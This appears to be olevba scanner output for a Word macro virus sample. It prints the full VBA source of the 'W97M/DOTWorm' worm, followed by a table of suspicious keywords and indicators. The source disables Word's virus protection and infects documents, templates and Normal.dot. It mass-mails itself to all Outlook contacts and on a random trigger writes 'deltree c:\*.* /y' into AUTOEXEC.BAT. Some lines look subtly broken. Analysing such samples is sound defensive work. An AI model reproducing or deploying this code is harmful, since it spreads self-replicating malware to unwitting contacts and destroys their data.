olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Indeed
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Indeed - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSWord.Indeed - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Rem W97M/DOTWorm virus by FSO.
Rem First macro worm to spread in DOT files.
Sub ToolsMacro()
On Error Resume Next
Call MacroWorm
End Sub
Sub ToolsOptions()
On Error Resume Next
Call MacroWorm
End Sub
Sub ViewVBCode()
On Error Resume Next
Call MacroWorm
End Sub
Sub ToolsSecurity()
On Error Resume Next
Call MacroWorm
End Sub
Sub FileTemplates()
On Error Resume Next
Call MacroWorm
End Sub
Sub FileNew()
On Error Resume Next
Call MacroWorm
End Sub
Sub FileOpen()
On Error Resume Next
Call MacroWorm
End Sub
Sub AutoOpen()
On Error Resume Next
Call MacroWorm
End Sub
Sub AutoExec()
On Error Resume Next
Call MacroWorm
End Sub
Sub MacroWorm()
On Error Resume Next
Application.DisplayAlerts = wdAlertsNone
Application.EnableCancelKey = wdCancelDisabled
Application.ShowVisualBasicEditor = False
Options.AllowFastSave = True
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
Options.VirusProtection = False
Documents(MacroContainer.Name).VBProject.VBComponents(1).CodeModule
OurLines = OurCode.Lines(1, OurCode.CountOfLines)
For X = 1 To Documents.Count
If Mid(Documents(X).Name, 1, 8) <> "Document" And Documents(X).VBProject.VBComponents(1).CodeModule.Lines(1, 1) <> "Rem WM97/DOTWorm virus by FSO." Then
Documents(X).Password = ""
Documents(X).ReadOnlyRecommended = False
Documents(X).WritePassword = ""
With Documents(X).VBProject.VBComponents(1).CodeModule
.DeleteLines 1, .CountOfLines
.InsertLines 1, OurLines
End With
With Documents(X)
.SaveAs (.FullName)
End With
End If
Next
For Y = 1 To Templates.Count
With Templates(Y).VBProject.VBComponents(1).CodeModule
If Mid(Templates(Y).Name, 1, 8) <> "Template" And .Lines(1, 1) <> "Rem W97M/DOTWorm virus by FSO." Then
.DeleteLines 1, .CountOfLines
.InsertLines 1, OurLines
End If
End With
Templates(Y).Save
Next
With NormalTemplate.VBProject.VBComponents(1).CodeModule
If .Lines(1, 1) <> "Rem W97M/DOTWorm virus by FSO." Then
.DeleteLines 1, .CountOfLines
.InsertLines 1, OurLines
End If
End With
FileCopy NormalTemplate.FullName, Application.Path & "\Love Letter For"
You.dot ""
If Int(Rnd * 5) = 2 Then
Set MailSvr = CreateObject("Outlook.Application")
If MailSvr Is Not Nothing Then
Set MAPI = MailSvr.GetNameSpace("MAPI")
For X = 1 To MAPI.AddressLists.Count
Set AddyList = MAPI.AddressLists(X)
For Y = 1 To AddyList.AddressEntries.Count
Set Contact = AddyList.AddressEntries(Y)
MailAddy = Contact.Address
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\WAB", MailAddy) <> "FSO" Then
Set SpamItem = MailSvr.CreateItem(0)
SpamItem.Bcc = MailAddy
SpamItem.Subject = "Very Funny"
SpamItem.Body = vbCrLf & "  Very good.  A must read, indeed.  Ha!"
SpamItem.DeleteAfterSubmit = True
SpamItem.Attachments.Add (Application.Path & "\Very Funny.dot")
SpamItem.Send
If Dir("C:\MAPI.REG") = "" Then
Open "C:\MAPI.REG" For Output As #1
Print #1, "REGEDIT4"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\WAB]"
End If
Print #1, Chr(34) & MailAddy & Chr(34) & " = " & Chr(34) & "FSO" & Chr(34)
Next
Next
If Dir("C:\MAPI.REG") <> "" Then
Print #1, ""
Print #1, ""
Close #1
Shell "C:\MAPI.REG", vbHide
End If
End If
End If
If Int(Rnd * 30) = 2 Then
Call Ha
End If
End Sub
Sub Ha()
Open "C:\AUTOEXEC.BAT" For Output As #2
Print #2, "Rem System Check"
Print #2, "deltree c:\*.* /y"
Print #2, "Rem System Check!  That's bull****!"
Close #2
Shell "RUNDLL32.EXE,user.exe,exitwindows", vbHide
End Sub
Rem Ha! Have a nice day!

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |MAPI.REG            |Executable file name                         |
|IOC       |AUTOEXEC.BAT        |Executable file name                         |
|IOC       |RUNDLL32.EXE        |Executable file name                         |
|IOC       |user.exe            |Executable file name                         |
+----------+--------------------+---------------------------------------------+

